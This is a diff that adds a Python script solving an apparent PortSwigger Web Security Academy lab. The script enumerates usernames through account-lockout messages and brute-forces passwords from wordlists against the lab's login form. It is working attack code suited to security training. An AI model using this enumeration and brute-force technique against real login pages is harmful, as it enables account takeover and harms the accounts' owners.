@@ -1,0 +1,55 @@
+import requests # Import the requests module to send requests
+
+def start():
+    labID = "LabID_HERE" # Change this with your lab ID for portswigger
+    usernames_list = r'USERNAME_LIST' # Change this with your usernames wordlist path file
+    passwords_list = r'PASSWORD-LIST' # Change this with your passwords wordlist path file
+
+    # Open and read the usernames and passwords files
+    with open(usernames_list, 'r') as file:
+        usernames = file.readlines()
+    with open(passwords_list, 'r') as file1: 
+        passwords = file1.readlines()
+
+    # Strip any whitespace and empty lines from usernames and passwords
+    usernames = [u.strip() for u in usernames]
+    passwords = [p.strip() for p in passwords]
+
+    url = f'https://{labID}.web-security-academy.net/login' # Construct the URL for the login page
+
+    
+    # Loop through each username and password combination
+    for username in usernames:
+        print(f'Trying username: # {username} #') # Print the current username being tried
+        green_flag = False # Initialize a flag to indicate if the correct username has been found
+        invalid_attempts = 0 # Initialize a counter for the number of attempts
+        
+        for password in passwords:
+            data = {'username': username,'password': password}
+
+            try:
+                # Send POST request
+                with requests.post(url, data=data) as req:
+                    response_text = req.text # Get the response text
+
+                # Check if the response contains any invalid message
+                if 'too many' in response_text:
+                    if not green_flag:
+                        print('-' * 60, f'\nAccount locked! Correct username ==> # {username} #\n', '-' * 60)
+                        green_flag = True
+                    print(f'- {password} ==> Invalid')
+                
+                elif 'Invalid username or password.' in response_text:
+                    print(f'- {password} ==> Invalid')
+                    invalid_attempts += 1 # Increment the counter for invalid attempts
+                    if not green_flag and invalid_attempts == 5:
+                        break  # Stop trying passwords for this username after 5 invalid attempts
+                
+                else:
+                    print('-'*60, f'\n## {username} : {password} ==> Succeeded! ##\n', '-'*60)
+                    return  # Exit once credentials are found
+
+            except requests.RequestException as e:
+                print(f"Error occurred while making a request: {e}")
+                return  # Exit on network error
+start() # Call the start function to begin the process
